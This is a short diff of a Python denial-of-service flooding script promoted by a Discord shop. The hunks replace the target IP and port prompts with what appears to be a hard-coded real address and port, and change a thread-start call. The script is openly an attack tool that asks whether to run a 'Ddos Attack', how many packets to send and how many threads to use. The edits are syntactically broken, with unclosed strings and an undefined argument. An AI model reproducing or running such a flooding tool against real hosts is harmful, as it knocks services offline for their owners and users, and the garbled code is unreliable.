@@ -17,8 +17,8 @@ Creat by ELDOB#7040
 FALLEGA SHOP https://discord.gg/yhHfTrRDMy
 """)
 print("\033[97m")
-ip= str(input(" ip :"))
-port= int(input(" port :"))
+ip= str(input(" ip :92.42.47.222:))
+port= int(input(" port :"4024))
 choice = str(input(" Ddos Attack?? (y/n):"))
 times= int(input(" Paket :"))
 threads= int(input(" threads :"))
@@ -56,4 +56,4 @@ for y in range(threads):
 		th.start()
 	else:
 		th = threading.Thread(target = run2)
-		th.start()
+		th.start(on)
